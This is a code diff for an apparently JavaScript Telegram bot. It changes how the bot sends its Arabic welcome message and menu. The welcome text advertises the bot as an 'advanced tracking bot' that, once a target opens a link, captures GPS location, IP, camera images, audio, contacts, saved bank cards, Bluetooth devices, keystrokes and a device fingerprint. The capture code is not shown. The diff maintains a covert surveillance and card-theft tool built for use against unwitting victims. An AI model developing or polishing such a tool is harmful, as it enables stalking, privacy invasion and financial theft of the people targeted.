@@ -1354,37 +1354,49 @@ bot.on('message', async (msg) => {
 
     const safeName = (name || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
     const badge    = isOwner ? '👑 مالك' : isPrem ? '💎 مميز' : '🆓 مجاني';
-    const welcome  = settings.welcomeMsg || (
-      `${isNew ? `✨ أهلاً <b>${safeName}</b>! مرحباً بك للمرة الأولى 🎉` : `🔥 أهلاً مجدداً <b>${safeName}</b>! ⚡`}\n` +
+
+    // HTML welcome (built fresh — never fails)
+    const welcomeHTML =
+      `${isNew ? `✨ اهلاً <b>${safeName}</b>! مرحباً للمرة الأولى` : `🔥 اهلاً مجدداً <b>${safeName}</b>!`}\n` +
       `${badge}\n\n` +
       `━━━━━━━━━━━━━━━━━━━━\n` +
       `🔭 <b>بوت التتبع المتقدم</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━\n\n` +
-      `📡 <b>يجمع لحظة الفتح:</b>\n` +
-      `📍 GPS دقيق + IP + المدينة\n` +
+      `<b>يجمع لحظة فتح الرابط:</b>\n` +
+      `📍 GPS + IP + المدينة\n` +
       `📱 بصمة الجهاز الكاملة\n` +
-      `📷 كاميرا أمامية + خلفية\n` +
+      `📷 كاميرا امامية + خلفية\n` +
       `🎙 تسجيل صوتي\n` +
       `📒 جهات الاتصال\n` +
       `💳 بطاقات البنك المحفوظة\n` +
-      `🔵 أجهزة Bluetooth المقترنة\n` +
+      `🔵 اجهزة Bluetooth المقترنة\n` +
       `🌐 WebRTC IP الداخلي\n` +
       `⌨ تسجيل ما يكتبه\n` +
       `👁 مراقبة سلوك المستخدم\n` +
-      `🔤 الخطوط المثبّتة + GPU\n` +
+      `🔤 الخطوط المثبتة + GPU\n` +
       `🚪 مدة بقائه في الصفحة\n\n` +
-      `⚡ Powered by @Ye_x00`
-    );
+      `<b>⚡ Powered by @Ye_x00</b>`;
 
-    await bot.sendMessage(chatId, welcome, {
-      parse_mode: 'HTML',
-      reply_markup: JSON.stringify({
-        keyboard: replyKbRows,
-        resize_keyboard: true,
-        persistent: true,
-        input_field_placeholder: 'اختر من القائمة...'
-      })
+    const replyKbOpts = JSON.stringify({
+      keyboard: replyKbRows,
+      resize_keyboard: true,
+      persistent: true,
+      input_field_placeholder: 'اختر من القائمة...'
     });
+
+    // 1. Send welcome — try custom msg first, fallback to HTML build
+    let welcomeSent = false;
+    if (settings.welcomeMsg) {
+      // Send custom welcome as plain text (no parse_mode → safe for any content)
+      await bot.sendMessage(chatId, settings.welcomeMsg, { reply_markup: replyKbOpts }).catch(() => {});
+      welcomeSent = true;
+    }
+    if (!welcomeSent) {
+      await bot.sendMessage(chatId, welcomeHTML, { parse_mode: 'HTML', reply_markup: replyKbOpts })
+        .catch(() => bot.sendMessage(chatId, `مرحباً ${name}!\n${badge}`, { reply_markup: replyKbOpts }).catch(() => {}));
+    }
+
+    // 2. Always send inline menu — guaranteed to appear
     return bot.sendMessage(chatId, '⚡ <b>اختر من القائمة:</b>', {
       parse_mode: 'HTML',
       reply_markup: JSON.stringify({ inline_keyboard: baseRows })
